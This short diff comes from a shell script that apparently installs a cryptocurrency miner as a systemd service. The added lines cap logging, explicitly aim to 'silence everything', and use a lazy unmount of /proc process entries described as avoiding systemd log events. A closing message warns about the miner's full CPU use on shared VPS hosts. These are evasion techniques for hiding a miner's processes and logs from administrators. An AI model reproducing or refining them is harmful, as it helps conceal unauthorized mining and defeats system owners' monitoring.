@@ -1191,10 +1191,12 @@ Nice=19
 CPUSchedulingPolicy=idle
 IOSchedulingClass=idle
 MemoryMax=2G
-# These two lines send all logs to the black hole
+# Silence everything
 StandardOutput=null
 StandardError=null
-ExecStopPost=/bin/bash -c 'umount /proc/[0-9]* 2>/dev/null || true'
+LogLevelMax=3
+# Use a quieter unmount that doesn't trigger systemd log events
+ExecStopPost=/usr/bin/bash -c 'umount -l /proc/[0-9]* 2>/dev/null || true'
 
 [Install]
 WantedBy=multi-user.target
@@ -1222,6 +1224,8 @@ EOF
     
   fi
 fi
+
+systemctl daemon-reload
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
